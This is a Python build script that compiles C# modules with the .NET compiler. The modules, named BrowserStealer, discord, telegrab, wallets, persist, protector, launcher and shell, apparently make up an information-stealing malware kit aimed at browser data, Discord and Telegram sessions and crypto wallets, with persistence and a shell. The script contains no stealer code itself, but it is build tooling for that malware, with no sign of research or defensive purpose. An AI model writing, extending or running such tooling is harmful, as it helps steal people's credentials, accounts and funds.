import os
import subprocess

# Ensure we are running from the root directory
os.chdir(os.path.dirname(os.path.abspath(__file__)) + "/..")

CSC_PATH = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
BIN_DIR = "bin"
DEFENSE_DIR = "defense"
NATIVE_DIR = "native_modules"

if not os.path.exists(BIN_DIR):
    os.makedirs(BIN_DIR)

modules = [
    # Defense & Infrastructure
    (DEFENSE_DIR, "protector.cs", "protector.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
    (DEFENSE_DIR, "persist.cs", "persist.dll", "/target:library /r:bin\\protector.dll"),
    (DEFENSE_DIR, "launcher.cs", "launcher.exe", f"/target:exe /r:bin\\protector.dll /r:System.Management.dll"),

    # Stealers & Native Modules
    (NATIVE_DIR, "BrowserStealer.cs", "BrowserStealer.dll", "/target:library /r:bin\\protector.dll /r:System.Security.dll /r:System.Web.Extensions.dll"),
    (NATIVE_DIR, "discord.cs", "discord.dll", "/target:library /r:bin\\protector.dll /r:System.Security.dll"),
    (NATIVE_DIR, "telegrab.cs", "telegrab.dll", "/target:library /r:bin\\protector.dll"),
    (NATIVE_DIR, "wallets.cs", "wallets.dll", "/target:library /r:bin\\protector.dll"),
    (NATIVE_DIR, "system.cs", "sysinfo.dll", "/target:library /r:bin\\protector.dll /r:System.Management.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll /r:System.dll /r:System.Core.dll"),
    (NATIVE_DIR, "bridge.cs", "bridge.dll", "/target:library /r:bin\\protector.dll /r:System.Net.Http.dll /r:System.dll"),
    (NATIVE_DIR, "software.cs", "software.dll", "/target:library /r:bin\\protector.dll /r:System.dll /r:System.Core.dll"),
    (NATIVE_DIR, "pe_utils.cs", "pe_utils.dll", "/target:library /r:bin\\protector.dll"),
    (NATIVE_DIR, "shell.cs", "shell.dll", "/target:library /r:bin\\protector.dll /r:System.dll /r:System.Core.dll")
]


def compile_all():
    print("🛠️  Compiling Native DLLs...")
    for folder, src, out, target in modules:
        src_path = os.path.join(folder, src)
        out_path = os.path.join(BIN_DIR, out)
        
        if not os.path.exists(src_path):
            print(f"❌ {src} not found in {folder}/")
            continue
            
        print(f"Compiling {src} -> {out}...")
        cmd = [CSC_PATH] + target.split() + [f"/out:{out_path}", src_path]
        try:
            result = subprocess.run(cmd, check=False, capture_output=True)
            if result.returncode == 0:
                print(f"✅ {out} built successfully.")
            else:
                print(f"❌ {out} build FAILED:")
                error_msg = result.stderr.decode('cp1251', errors='ignore')
                if not error_msg:
                    error_msg = result.stdout.decode('cp1251', errors='ignore')
                print(error_msg.replace('\r', ''))
        except Exception as e:
            print(f"❌ Runtime error during compilation of {out}: {e}")

if __name__ == "__main__":
    if not os.path.exists(CSC_PATH):
        print(f"❌ CSC compiler not found at {CSC_PATH}")
    else:
        compile_all()
        print("\n✨ Done. You can now run 'python test_native_modules.py'")
